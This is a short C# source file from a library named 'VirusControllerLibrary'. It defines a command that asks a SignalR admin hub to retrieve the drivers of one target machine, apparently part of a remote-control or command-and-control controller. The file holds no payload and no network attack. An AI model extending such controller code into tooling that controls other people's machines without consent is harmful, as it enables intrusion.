using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class GetDriversCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public override string Name => "GetDrivers";
        public string TargetId { get; private set; }

        public GetDriversCommand(string targetId) =>
            TargetId = targetId;

        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId);
    }
}
